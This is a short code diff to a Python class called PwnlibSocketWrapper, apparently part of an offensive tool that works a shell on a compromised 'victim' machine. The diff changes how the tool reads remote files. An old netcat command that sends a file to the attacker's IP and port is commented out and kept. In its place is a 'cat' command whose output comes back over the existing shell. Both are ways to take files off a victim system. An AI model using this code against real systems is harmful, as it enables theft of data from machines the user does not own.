@@ -52,14 +52,18 @@ class PwnlibSocketWrapper:
         return output_remote_temporary_file
 
     def read_remote_file(self, remote_path: str) -> str:
-        thread = utilities.ThreadWithReturnValue(target=self.listen_for_netcat_file_upload_from_victim)
+        # Old implementation that I want to keep around for a while
+        """ thread = utilities.ThreadWithReturnValue(target=self.listen_for_netcat_file_upload_from_victim)
         thread.start()
 
         upload_command = f'nc -w 5 {self.attacker_ip} {self.netcat_file_transfer_port} < {remote_path}'.encode()
         self.client.sendline(upload_command)
 
-        downloaded_output = thread.join()
-        return downloaded_output.decode(self.encoding)
+        downloaded_output = thread.join() """
+
+        cat_command = f'cat {remote_path}'.encode()
+        file_contents = self.send_command_read_output(cat_command)
+        return file_contents
     
     def write_remote_file(self, remote_path: str, content: str):
         for line in content.split('\n'):
